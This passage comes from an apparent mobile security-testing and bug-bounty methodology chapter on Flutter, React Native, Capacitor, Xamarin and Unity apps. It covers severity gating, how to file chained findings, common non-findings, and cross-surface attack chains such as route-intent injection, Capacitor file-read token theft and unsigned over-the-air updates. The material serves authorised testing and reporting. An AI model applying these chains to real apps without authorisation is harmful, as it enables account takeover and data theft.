  - "This is a Flutter app with an exported `FlutterActivity`; `getInitialRoute()` reads the `route` intent
    extra before any manifest configuration, so any installed app selects the first screen rendered."
  - "This app uses expo-updates without a code-signing certificate, so this JS-layer control can be removed
    remotely after the assessment without a store release."
  Run the **pre-severity gate** against the Critical *claim*, not the bug: have you validated the full chain
  to attacker-attainable impact or only one primitive; what does the attacker walk away with in one concrete
  sentence; have you reproduced the full chain end-to-end at least twice; is there still an inheritance,
  signature or audience check gating it; has the programme rejected this class before.
- **Proof:** A reproduction section a triager can follow on a clean device, and an impact sentence that names
  a concrete outcome rather than "could lead to".
- **Escalation:** n/a. Note the counterpart discipline: **do not retract a confirmed finding that stopped
  reproducing because the client patched mid-engagement** — keep timestamped pre-patch evidence and say so.
  A finding you genuinely could not reproduce goes in a retraction appendix, which reads as rigour, not noise.
- **Ruled out when:** n/a. Apply to every submission.

### D19-079 · Chain-filing order for framework chains

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (submission control) |
| **Attacker** | n/a |
| **Applies to** | any D19 finding that is a chain — which most of the P1s in this chapter are |
| **Maps to** | n/a (method; drawn from the bug-hunting corpus's reporting register) |

- **Test:** The high-value outcomes here are chains: *bundle-recovered endpoint* + *shadow-API auth
  regression*; *loose allow-list* + *`/_capacitor_file_`* + *token replay*; *unsigned OTA* + *client-side auth
  gate*. Filing them as one report gets one bounty; filing them in the wrong order leaves you with dangling
  cross-references.
- **How:** (1) Identify the highest-severity chained outcome. (2) File **each chain primitive as its own
  report** at its standalone severity — typically P3/P4 — leaving a placeholder cross-reference line.
  (3) File the chain consumer with the full ATO/RCE narrative at the chained severity, filling in the real
  primitive ids. (4) Edit each primitive to backfill the consumer's id. The consumer body carries:
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — [primitive 1]
  - **submission [UUID-2]** — [primitive 2]
  These primitives have independent fix surfaces and are filed separately per the programme's
  "one fix = one bounty" rule.
  ```
  Do not paste the whole chain narrative into every primitive, do not claim each primitive is independently
  P1, and do not ask for a single combined bounty — frame the chain as a **severity amplifier, not a merge
  request**. Do not file everything within minutes of each other either; that reads as low-effort spam.
- **Proof:** Cross-referenced ids in both directions.
- **Escalation:** n/a.
- **Ruled out when:** The finding genuinely has one fix surface — for example an unsigned OTA channel, which
  is a single configuration change. File that as one report.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "The Hermes bundle can be decompiled" / "`hbctool` disassembles it" | `lack_of_binary_hardening.lack_of_obfuscation` is **P5**. Bytecode raises effort, it is not a control | A credential, endpoint or client-side gate recovered *from* it, validated (D19-012) or exercised (D19-074) |
| "`libapp.so` parses in Blutter" / "Dart AOT is not obfuscated by default" | Same. Recovery is a toolchain fact | A key, signing algorithm or route recovered from `pp.txt` and used (D19-035 → D19-038) |
| "`global-metadata.dat` is readable, so the C# is recoverable" | Same | A client-authoritative entitlement the server then accepts (D19-063) |
| "Xamarin DLLs decompile to source in ILSpy" | Same | A hardcoded key that decrypts real stored data, or a validated live credential (D19-067) |
| "Flutter ignores the system proxy, so we could not intercept" | A tooling result, not an app property. Reporting it misleads the vendor | Nothing — it is a methodology step. Do the interception (D19-039) and report what the traffic shows |
| "Flutter pinning was bypassed with reFlutter / a Frida hook" | `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` is **P5**, and AM-07 (network attacker with a trusted CA) is a tester convenience, not an attacker | The data exposed in the now-visible traffic: tokens in URLs, unauthenticated endpoints, IDOR (D14/D15) |
| "The APK was repacked with a modified bundle, re-signed and it ran" | `lack_of_binary_hardening.*` is **P5**; every unprotected app behaves this way | The control the patch defeated, where the server honours the client's state (D19-021 → D19-074) |
| "Root/emulator detection was bypassed in Dart/C#/JS" | `lack_of_binary_hardening.lack_of_jailbreak_detection` is **P5** | What the bypass unlocks — a local vault that decrypts, a paid tier the server accepts, a hidden admin console (D19-068) |
| "APKiD shows no obfuscator or packer" | MASTG-TECH-0165 frames this as a statement of fact about the build | Nothing. It is the evidence paragraph that stops a real finding being closed as "not exploitable" (D19-005) |
| "`RKStorage` / `CapacitorStorage.xml` / `FlutterSharedPreferences.xml` is unencrypted" | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` is **P5** | Replaying the token you found against the API to reach another session (D19-024), or reading it remotely through `/_capacitor_file_` (D19-049) |
| "The CodePush deployment key is embedded in the APK" | It is documented and expected; the key alone grants nothing | The **absence** of `CodePushPublicKey`, making the channel unsigned (D19-027) |
| "The mobile app calls `/api/v1` while the web app calls `/api/v3`" | A version difference alone is **Informational** | A demonstrated weakened control on v1: no auth, no 429, weaker validation, extra fields (D19-073) |
| "An OAuth `client_secret` is in the JS bundle" | Known and expected for a public mobile client; on the never-submit list | PKCE **non-enforcement** — the authorisation server accepting a code exchange without a matching verifier (-> D13) |
| "`libflutter.so` / `libhermes.so` lacks a stack canary" | **MASTG-TEST-0223** documents this as a known React Native / Flutter false positive | Nothing in this domain. Do not file it |
| "The framework renders secrets into Recents / screenshots" | `insecure_data_storage.screen_caching_enabled` is **P5** | Nothing on its own; at most a supporting observation in a chain that already has impact (-> D20) |
| "The app pulls in unused permissions via plugin autolinking" | Over-permissioning alone is Low at best | Pairing a granted permission with a reachable bridge primitive that turns it into attacker data access (D19-051) |
| "WebView debugging is enabled but there is no bridge and no sensitive content" | Medium at most, and only with ADB access | The bridge being present, so the console reaches `/_capacitor_file_` or a plugin (D19-058 → D19-049) |
| "The app runs inside a dual-instance / virtualisation container" | Out of this domain's scope and usually a platform-level argument | Demonstrating the container process reading the target's `shared_prefs` and the token still working (-> D21) |
| "`kernel_blob.bin` ships in the release build" | A build-hygiene observation on its own | The Dart VM service actually listening, or debug-only entry points reachable from it (D19-032) |

## Cross-surface joins

- **Hermes string table (D19-009/D19-010) × the manifest's single exported activity (D04/D09).** The bundle
  lists every screen name; the manifest lists one `MainActivity`. Nobody reviews them together, so a
  staff-only or debug screen that the navigator exposes by name is reachable through the one deep-link entry
  point the manifest review already cleared as "correctly configured".
- **Dart object pool (D19-035/D19-038) × the backend's rate limiting and WAF (D15).** A recovered
  request-signing key and template lets you generate valid signed requests from a script. Every control that
  assumed "only our app can produce this signature" — rate limits keyed on the client, bot detection, replay
  windows — evaporates at once, and the API team has no idea their signature is the only gate.
- **Capacitor `/_capacitor_file_` (D19-049) × the storage key names mined from the web bundle (D11/D19-024).**
  The file-read primitive is only as good as the path you feed it. The bundle tells you the exact
  `CapacitorStorage` key and database filename, converting a generic "arbitrary file read" into a one-request
  session-token theft — and converting a P5 "unencrypted internal storage" finding into a P1 remote read.
- **The bundle's endpoint inventory (D19-011) × API versioning (D15/D19-073).** The mobile client is the only
  place the *old* API version's route list still exists in full. Joining the two surfaces is how you find the
  v1 handler that the web team retired from their client but never removed from the server, with its
  pre-fix auth middleware intact.
- **OTA channel (D19-025 → D19-028) × every client-side control in the report (D13/D21/D23).** If the channel
  is unsigned, every JS-layer control you did *not* report as broken can be removed remotely after the
  engagement ends. That is the sentence that upgrades an OTA finding from "config issue" to "the security
  model of this client is advisory", and it belongs in the executive summary, not a footnote.
- **Flutter `route` intent extra (D19-042) × a path-taking `MethodChannel` handler (D19-040/D16).** Route
  injection alone reaches a screen; a channel handler alone needs a caller. Joined, a zero-permission local
  app selects the screen that calls the channel with parameters it controls — an attacker-reachable arbitrary
  file operation that neither the activity review nor the JNI review would find alone.
- **CodePush/expo deployment key in the APK (D19-025) × the update service's tenancy model (D18).** The key is
  "not a secret" in isolation. Joined with an update backend that scopes deployments only by that key, it
  enumerates and targets a specific deployment — and if the backend also lets a key holder *publish*, the
  P5 observation becomes the P1.
- **`react-native-webview` / `unity-webview` media auto-grant (D19-022) × the host app's `CAMERA`/`RECORD_AUDIO`
  grant (D03).** The plugin auto-grants; the app already holds the permission for a legitimate feature.
  Neither review flags the other, and published research found neither plugin offered a way for the app to
  deny WebView media access at all — so the app cannot opt out without patching the plugin.
- **Split-APK collection (D19-002) × the native-library review (D16).** A "library not present, not
  applicable" negative in the native chapter is frequently just a missing ABI split. The join is procedural
  rather than technical, and it silently voids whole sections of a report.
- **Unity `PlayerPrefs` edit (D19-064) × the entitlement endpoint (D15/D23).** The local edit is P5 storage.
  The server accepting it is revenue loss. Only testing both together tells you which one you have — and the
  same logic applies to Flutter `shared_preferences` and RN `AsyncStorage` subscription caches.

## Sources

- OWASP MASTG/MASVS: MASTG-TEST-0237 (Cross-Platform Framework Configurations Allowing Cleartext Traffic,
  status *placeholder*), MASTG-TEST-0334, MASTG-TEST-0223 (the documented RN/Flutter stack-canary false
  positive); MASTG-TECH-0019, -0041, -0109, -0140, -0141, -0142, -0145, -0150, -0151, -0156, -0160, -0164,
  -0165, -0172, -0173, -0174; MASTG-TOOL-0001, -0009, -0011, -0029, -0034, -0077, -0100, -0101, -0103, -0104,
  -0107, -0112, -0116, -0120, -0124, -0125, -0129, -0144; MASWE-0004, -0026, -0033, -0034, -0035, -0048,
  -0049, -0059; MASTG-KNOW-0015, -0018.
- Bugcrowd VRT release 2026-07-08 (581 entries) for every severity anchor in this chapter, including the
  observation that the entire mobile branch is P5 and the specific P1/P2 nodes an item must aim at.
- MITRE ATT&CK Mobile: T1406, T1407, T1533, T1575, T1617, T1633, T1658, T1670, T1521.003.
- Framework source read directly: Capacitor `Bridge.java`, `MessageHandler.java`, `CapConfig.java`,
  `PluginManager.java`, `WebViewLocalServer.java`, `AndroidProtocolHandler.java`, `plugin/CapacitorHttp.java`;
  Cordova `SystemWebViewEngine.java`, `SystemExposedJsApi.java`, `CordovaBridge.java`, `ConfigXmlParser.java`,
  `WhitelistPlugin.java`; React Native `devsupport/DevServerHelper.kt`, `ReactAndroid` manifest,
  `RNCWebView.java`, `RNCWebViewManager.kt`; Flutter `FlutterActivityLaunchConfigs.java`;
  Microsoft `CodePush.java` / `CodePushConstants.java` and `docs/setup-android.md`; Expo
  `UpdatesConfiguration.kt` and the Expo code-signing documentation; facebook/hermes `BytecodeFileFormat.h`
  and `BytecodeVersion.h`.
- Tooling documentation and version ranges: `hbctool`, `hermes-dec`, `hermes_rs`, `hermes-decomp`,
  `react-native-decompiler`, `hbcdump`, `blutter`, `reFlutter`, `disable-flutter-tls-verification`,
  `Il2CppDumper`, `Zygisk-Il2CppDumper`, `frida-il2cpp-bridge`, `pyxamstore`, `pymauistore`, `Fridax`,
  `@akabe1/frida-multiple-unpinning`, objection `pinning.ts`, `@Gand3lf/xamarin-antiroot`, LIEF,
  `uber-apk-signer`, `gitleaks`, `apkid`.
- Published research and case studies: the IQCrafter Flutter study (object-pool reversing, `x27`/Smi
  encoding, two RSA private keys recovered from `libapp.so`, stripped static BoringSSL with 47 GPU-only
  exports, syscall-level TLS record detection, the request-signing template and its offline reproduction);
  reversethat.app's DroidPass analysis (Smi-encoded key reconstruction, SHA-256 → AES-256 with an `IV_SALT`
  derived IV); the Pilfer React Native instrumentation write-up (`CatalystInstanceImpl` hooks,
  `__fbBatchedBridge`/`nativeModuleProxy`/`__r`/`__d`/`__c`, `XMLHttpRequest._interceptor`); Payatu's Hermes
  modification workflow; katyscode's IL2CPP metadata-obfuscation research (`0xFAB11BAF`, the
  `il2cpp_init()` → `MetadataLoader::LoadMetadataFile()` chain); the HN Security and mwalkowski Xamarin/.NET
  MAUI 9 write-ups (`XABA`, `XALZ`, the 28-byte descriptor); the Appknox Xamarin guide; kayssel's Flutter
  guide; tinyhack on the Dart snapshot hash; the SecWeb 2022 paper "The Bridge between Web Applications and
  Mobile Platforms is Still Broken" (the `react-native-webview` / `unity-webview` media auto-grant).
- Named vulnerabilities: CVE-2025-11953 (`@react-native-community/cli`, CVSS 9.8, fixed in 20.0.0);
  CVE-2024-21668 (`react-native-mmkv` < 2.11.0 logging the encryption key); `react-native-document-picker`
  < 9.1.1 path traversal; CVE-2026-27704 (Dart < 3.11.0 / Flutter < 3.41.0 Pub-cache Zip Slip);
  CVE-2025-59489 (Unity Runtime arbitrary code execution, advisory "Security Sept-2025-01"); CVE-2023-2507
  (CleverTap Cordova plugin ≤ 2.6.2 deep link → arbitrary JS in the main WebView); CVE-2025-27363 (FreeType,
  via the Unity bundling table); the LEGACY Cordova set CVE-2015-5256, CVE-2015-1835, CVE-2014-3500,
  CVE-2014-3501, CVE-2014-3502 and the Google ASI Apache Cordova campaigns (2015-06-29, 2015-12-14, fix line
  4.1.1+).
- Supply-chain incidents: the StepSecurity 2026-03 React Native npm compromise (named packages, versions,
  relay chain, Solana C2, `~/init.json` marker) and the Wiz 2025-06 React Native / GlueStack backdoor
  (16 packages, whitespace obfuscation, RAT capability set, `@react-native-aria/focus@0.2.10` origin); the
  XCSSET `universal_file_viewer` 0.1.5 pub.dev incident with its explicit reachability caveat; OSV `MAL-`
  namespace records.
- The bug-hunting corpus mined from a 4,467-star repository, for the cross-cutting discipline in D19-073,
  D19-074, D19-077, D19-078 and D19-079: the shadow-API behavioural-diff method, the layer-ordering trap,
  marker discipline, the body-diff rule, the statistical-sample rule, server-policy-versus-state, the
  shell-loop ban, the five-screenshot state-change pattern, HAR sanitising and the mask-versus-leave-visible
  split, the pre-severity gate, retraction-appendix discipline, and chain-filing order.
- Android platform documentation for the API gates quoted throughout: the Android 14 behaviour changes
  (the `setReadOnly()` mandate covering DEX/JAR/APK but **not** JS or Dart bundles; the implicit-intent
  restriction), the Android 15 16 KB page-size requirement for NDK libraries, and the dynamic-code-loading
  and insecure-WebView-native-bridge risk pages.
